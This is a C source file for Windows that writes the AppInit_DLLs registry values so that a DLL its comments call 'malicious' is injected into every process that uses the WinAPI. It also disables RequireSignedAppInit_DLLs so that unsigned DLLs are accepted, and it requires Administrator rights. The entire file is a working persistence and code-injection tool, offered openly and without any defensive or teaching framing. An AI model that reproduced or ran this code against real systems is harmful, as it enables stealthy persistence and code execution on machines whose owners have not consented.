/*
Requires Administrator privileges

    Targeted DLL: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
	The following keys must be set to the respective values:
		- AppInitDLLs - Set this to the full path of the malicious DLL (C:\Users\Administrator\Desktop\inject.dll)
		- LoadAppInit_DLLs - 1
		- RequireSignedAppInit_Dlls - 0
	
	Then any process that utilizes WinAPI within Windows will trigger execution of our malicious DLL 
*/

#include <windows.h>
#include <stdio.h>

char maliciousDLLPath[] = {"C:\\Users\\Administrator\\Desktop\\inject.dll"}; //Change this to malicious DLL
char appInitDllsPath[] = {"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"};
char appInitDllsSubkey[] = {"AppInit_DLLs"};
char appInitDllsLoadPath[] = {"LoadAppInit_DLLs"};
char appInitDllsRequireSignedPath[] = {"RequireSignedAppInit_DLLs"};
DWORD signedValue = 0x0;
DWORD loadValue = 0x1;

int main() {
    HKEY hKey;
    LSTATUS openResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, appInitDllsPath, 0, KEY_ALL_ACCESS, &hKey);
    if (openResult != ERROR_SUCCESS) {
        // Error encountered opening registry key
        if (openResult == ERROR_FILE_NOT_FOUND) {
            printf("Key not found!\n");
            return 0;
        } else {
            printf("Error opening key!\n");
            return 0;
        }
    } else {
        // Successfully opened registry key
        printf("Opened key!\n");
        LSTATUS setAppInitDllsSubkeyResult = RegSetValueEx(hKey, appInitDllsSubkey, 0, REG_SZ, maliciousDLLPath, sizeof(maliciousDLLPath));
        if (setAppInitDllsSubkeyResult != ERROR_SUCCESS) {
            printf("Error encountered when setting AppInit_DLLs path\n");
            return 0;
        } else {
            printf("Successfully set path to malicious DLL for AppInit_DLLs path\n");
        }
        // REG_DWORD 
        // Data will be HexValue
        LSTATUS setAppInitDllsLoadPathResult = RegSetValueEx(hKey, appInitDllsLoadPath, 0, REG_DWORD, (BYTE*)&loadValue, sizeof(0x1));
        if (setAppInitDllsLoadPathResult != ERROR_SUCCESS) {
            printf("Error encountered when setting the DLLs load path to 1\n");
            return 0;
        } else {
            printf("Successfully set DLLs load path to 1\n");
        }

        LSTATUS setSignedPathResult = RegSetValueEx(hKey, appInitDllsRequireSignedPath, 0, REG_DWORD, (BYTE*)&signedValue, sizeof(0x0));
        if (setSignedPathResult != ERROR_SUCCESS) {
            printf("Error encountered when setting the signed DLLs path\n");
            return 0;
        } else {
            printf("Successfully set signed DLLs path to 0\n");
        }

        RegCloseKey(hKey);
    }

}